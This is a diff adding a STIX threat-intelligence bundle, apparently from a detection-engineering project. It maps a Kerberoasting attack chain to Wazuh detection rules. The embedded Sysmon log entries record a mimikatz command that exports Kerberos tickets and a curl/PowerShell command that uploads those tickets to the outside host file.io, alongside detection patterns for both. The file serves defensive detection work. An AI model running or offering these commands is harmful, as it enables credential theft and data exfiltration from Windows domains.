@@ -1,0 +1,283 @@
+{
+    "type": "bundle",
+    "id": "bundle--d9de0884-c8a5-42d4-bb3c-a920d922f9ce",
+    "objects": [
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--f29dcfed-c5b7-4fda-84d8-8a232946d68e",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:32.760461Z",
+            "modified": "2025-07-25T15:19:32.760461Z",
+            "name": "Credentials Access - Kerberoasting",
+            "behavior_class": "anomalous",
+            "technique": "T1558.003",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--6b42723c-7ccb-471a-aa27-0e6cdb77d6f9": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0006"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--867d2db0-a6ca-4a2d-b3f9-b1c6cdcf9d0d",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:32.761752Z",
+            "modified": "2025-07-25T15:19:32.761752Z",
+            "name": "Wazuh Detection for Credentials Access - Kerberoasting",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {C:\\\\mimikatz\\\\mimikatz.exe \\\\\\\"\\\"Kerberos::list /export\\\\\\\"\\\" exit move *.kirbi C:\\\\mimikatz}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\test.SRI\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "Medium",
+                        "logonGuid": "{3d676676-9527-6883-c1f9-160000000000}",
+                        "logonId": "0x16f9c1",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{3d676676-952a-6883-3901-000000002e00}",
+                        "parentProcessId": "7160",
+                        "parentUser": "SRI\\\\test",
+                        "processGuid": "{3d676676-a082-6883-c402-000000002e00}",
+                        "processId": "2732",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1059.001,technique_name=PowerShell",
+                        "terminalSessionId": "0",
+                        "user": "SRI\\\\test",
+                        "utcTime": "2025-07-25 15:19:30.822"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4876130",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-07-25 15:19:30.822\r\nProcessGuid: {3d676676-a082-6883-c402-000000002e00}\r\nProcessId: 2732\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {C:\\mimikatz\\mimikatz.exe \\\"\"Kerberos::list /export\\\"\" exit\nmove *.kirbi C:\\mimikatz}\r\nCurrentDirectory: C:\\Users\\test.SRI\\AppData\\Local\\Temp\\\r\nUser: SRI\\test\r\nLogonGuid: {3d676676-9527-6883-c1f9-160000000000}\r\nLogonId: 0x16F9C1\r\nTerminalSessionId: 0\r\nIntegrityLevel: Medium\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {3d676676-952a-6883-3901-000000002e00}\r\nParentProcessId: 7160\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: SRI\\test\"",
+                        "opcode": "0",
+                        "processID": "3332",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-25T15:19:30.8269655Z",
+                        "task": "1",
+                        "threadID": "6012",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EIAogIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSkuKktlcmJlcm9zOjpsaXN0XHMrL2V4cG9ydC4qXHMrLipcXC5raXJiaS4qJwpd",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--3a553df8-8952-419e-8f8b-c71ffc0e6b54": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b34954c3-d789-4bdb-9943-13cf9bd1dd00",
+            "created": "2025-07-25T15:19:32.762317Z",
+            "modified": "2025-07-25T15:19:32.762317Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--f29dcfed-c5b7-4fda-84d8-8a232946d68e",
+            "target_ref": "x-oca-detection--867d2db0-a6ca-4a2d-b3f9-b1c6cdcf9d0d"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--59026270-7ca7-46a4-982e-f52a56b09c51",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:35.656538Z",
+            "modified": "2025-07-25T15:19:35.656538Z",
+            "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+            "description": "Exfiltrate extracted tickets, likely for offline password cracking",
+            "behavior_class": "anomalous",
+            "technique": "T1048.002",
+            "platforms": [
+                {
+                    "operating_system": "The curl executable",
+                    "version": "8.9.1"
+                }
+            ],
+            "extensions": {
+                "extension-definition--6b42723c-7ccb-471a-aa27-0e6cdb77d6f9": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0010"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--8e0f0611-a68a-46f8-ad52-90a5629ba6fa",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:35.657699Z",
+            "modified": "2025-07-25T15:19:35.657699Z",
+            "name": "Wazuh Detection for Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\Curl.exe\\\" -k -s -Ffile=@C:\\\\mimikatz\\\\0-40e10000-test@krbtgt~SRI.LOCAL-SRI.LOCAL.kirbi https://file.io",
+                        "company": "curl, https://curl.se/",
+                        "currentDirectory": "C:\\\\Users\\\\test.SRI\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "The curl executable",
+                        "fileVersion": "8.9.1",
+                        "hashes": "SHA1=FA8E9959DDF23A8FE1226B3BA48CF6D683C561A8,MD5=6DF52ACFBF5F48630841F469D6691FB5,SHA256=8B39C07EC671DAFB125BDC0E5FD4D51BC4A7D73E505C63C95F976698BBBD5699,IMPHASH=5AB6BFAF3A98F68848DE5330AE012619",
+                        "image": "C:\\\\Windows\\\\System32\\\\curl.exe",
+                        "integrityLevel": "Medium",
+                        "logonGuid": "{3d676676-9527-6883-c1f9-160000000000}",
+                        "logonId": "0x16f9c1",
+                        "originalFileName": "curl.exe",
+                        "parentCommandLine": "\\\"powershell.exe\\\" &amp; {Get-ChildItem -Path \\\\\\\"\\\"C:\\\\mimikatz\\\\\\\"\\\" -Filter *.kirbi | ForEach-Object { Write-Host \\\\\\\"\\\" `r`nUploading $($_.FullName)\\\\\\\"\\\"; C:\\\\Windows\\\\System32\\\\Curl.exe -k -s -F\\\\\\\"\\\"file=@$($_.FullName)\\\\\\\"\\\" https://file.io }}",
+                        "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "parentProcessGuid": "{3d676676-a084-6883-c902-000000002e00}",
+                        "parentProcessId": "444",
+                        "parentUser": "SRI\\\\test",
+                        "processGuid": "{3d676676-a084-6883-cb02-000000002e00}",
+                        "processId": "2404",
+                        "product": "The curl executable",
+                        "ruleName": "technique_id=T1105,technique_name=Ingress Tool Transfer",
+                        "terminalSessionId": "0",
+                        "user": "SRI\\\\test",
+                        "utcTime": "2025-07-25 15:19:32.654"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4876162",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1105,technique_name=Ingress Tool Transfer\r\nUtcTime: 2025-07-25 15:19:32.654\r\nProcessGuid: {3d676676-a084-6883-cb02-000000002e00}\r\nProcessId: 2404\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 8.9.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: \"C:\\Windows\\System32\\Curl.exe\" -k -s -Ffile=@C:\\mimikatz\\0-40e10000-test@krbtgt~SRI.LOCAL-SRI.LOCAL.kirbi https://file.io\r\nCurrentDirectory: C:\\Users\\test.SRI\\AppData\\Local\\Temp\\\r\nUser: SRI\\test\r\nLogonGuid: {3d676676-9527-6883-c1f9-160000000000}\r\nLogonId: 0x16F9C1\r\nTerminalSessionId: 0\r\nIntegrityLevel: Medium\r\nHashes: SHA1=FA8E9959DDF23A8FE1226B3BA48CF6D683C561A8,MD5=6DF52ACFBF5F48630841F469D6691FB5,SHA256=8B39C07EC671DAFB125BDC0E5FD4D51BC4A7D73E505C63C95F976698BBBD5699,IMPHASH=5AB6BFAF3A98F68848DE5330AE012619\r\nParentProcessGuid: {3d676676-a084-6883-c902-000000002e00}\r\nParentProcessId: 444\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"powershell.exe\" & {Get-ChildItem -Path \\\"\"C:\\mimikatz\\\"\" -Filter *.kirbi | ForEach-Object { Write-Host \\\"\" `r`nUploading $($_.FullName)\\\"\"; C:\\Windows\\System32\\Curl.exe -k -s -F\\\"\"file=@$($_.FullName)\\\"\" https://file.io }}\r\nParentUser: SRI\\test\"",
+                        "opcode": "0",
+                        "processID": "3332",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-25T15:19:32.6562814Z",
+                        "task": "1",
+                        "threadID": "6012",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdjdXJsLmV4ZScgQU5EIAogIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSkuKi1zLiotRi4qXFwua2lyYmkuKmZpbGVcXC5pby4qJwpd",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--3a553df8-8952-419e-8f8b-c71ffc0e6b54": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1aeef805-6796-48f6-87fe-f3e3e292d7f4",
+            "created": "2025-07-25T15:19:35.658247Z",
+            "modified": "2025-07-25T15:19:35.658247Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--59026270-7ca7-46a4-982e-f52a56b09c51",
+            "target_ref": "x-oca-detection--8e0f0611-a68a-46f8-ad52-90a5629ba6fa"
+        },
+        {
+            "type": "identity",
+            "spec_version": "2.1",
+            "id": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:23.661216Z",
+            "modified": "2025-07-25T15:19:23.661216Z",
+            "name": "Resilmesh Project"
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--6b42723c-7ccb-471a-aa27-0e6cdb77d6f9",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:23.662314Z",
+            "modified": "2025-07-25T15:19:23.662314Z",
+            "name": "x-oca-behavior Extension Definition",
+            "description": "This schema creates a new object type called x-oca-behavior. x-oca-behavior objects describe higher-level functionality than can be described using SCOs.",
+            "schema": "https://raw.githubusercontent.com/opencybersecurityalliance/stix-extensions/main/2.x/schemas/x-oca-behavior.json",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--3a553df8-8952-419e-8f8b-c71ffc0e6b54",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:23.663215Z",
+            "modified": "2025-07-25T15:19:23.663215Z",
+            "name": "x-oca-detection Extension Definition",
+            "description": "This schema creates a new object type called detection, which contain queries or other actionable information that can identify an event or behavior.",
+            "schema": "https://raw.githubusercontent.com/opencybersecurityalliance/stix-extensions/main/2.x/schemas/x-oca-detection.json",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--0135f69f-19d3-4053-ba20-26628aec2631",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:23.66302Z",
+            "modified": "2025-07-25T15:19:23.66302Z",
+            "name": "x-oca-detector Extension Definition",
+            "description": "This schema creates a new object type called detector, which describes software that is capable of performing detections.",
+            "schema": "https://raw.githubusercontent.com/opencybersecurityalliance/stix-extensions/main/2.x/schemas/x-oca-detector.json",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--1d87aaa0-ddb1-4be3-a961-da5fdc6982c5",
+            "created_by_ref": "identity--9768badf-a558-40ee-84a3-e94f5cdad6c9",
+            "created": "2025-07-25T15:19:23.663373Z",
+            "modified": "2025-07-25T15:19:23.663373Z",
+            "name": "x-oca-asset Extension Definition",
+            "description": "This schema creates a new object type called x-oca-asset.",
+            "schema": "TBD",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e19f93f5-b6f5-424c-8fa0-696346441088",
+            "created": "2025-07-25T15:19:35.659027Z",
+            "modified": "2025-07-25T15:19:35.659027Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--f29dcfed-c5b7-4fda-84d8-8a232946d68e",
+            "target_ref": "x-oca-behavior--59026270-7ca7-46a4-982e-f52a56b09c51"
+        }
+    ]
+}
